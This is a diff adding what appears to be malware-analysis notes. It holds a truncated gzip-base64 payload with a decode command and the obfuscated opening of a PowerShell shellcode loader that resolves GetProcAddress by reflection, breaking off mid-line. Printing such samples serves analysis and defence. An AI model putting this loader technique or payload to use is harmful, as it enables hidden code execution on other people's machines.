@@ -1,0 +1,10 @@
+You'll see the full base64 is not present, but is still able to be decoded. Trying to b64 decode, and gzip decode in other programs won't work.
+
+./gzipd.py -d H4sIACd2rV8CA7VWe2+bSBD/O5H6HVBlyaA4BiduLhcp0i022FCTmmDj11knAmvYsjzKI7bT63e/WRva9JpW7UmHkNidnedvZnbYlLFbkCTm6CDlPr46PRk7mRNxfMNNDFNvcY2nQSmcnMBBI+8vuFuOX6E07SeRQ+L1zU2vzDIcF8d9e4ALlOc4eqAE57zA/c3NApzh83cP77FbcB+5xl/tAU0eHFqx7XuOG2DuHMUeOxslrsOcaVspJQXf/PPPprA676zbyofSoTnftPZ5gaO2R2lT4D4JzOBkn2K+aRA3S/JkU7RnJL68aE/j3NngO9D2iA1cBImXNwUIAt4MF2UWcywcJn885ZuwHGeJizwvw3nebHErpnm1Xv/Bryqz92VckAi3tbjAWZJaOHskLs7bQyf2KL7HmzVIWUVGYn8tCMD2mISYb8QlpS3uV9Twd3hbg/azQvxzIeAa
+
+
+function lGp {
+        Param ($coMQJ, $zGu)
+        $sDY = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+        return $sDY.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object Int
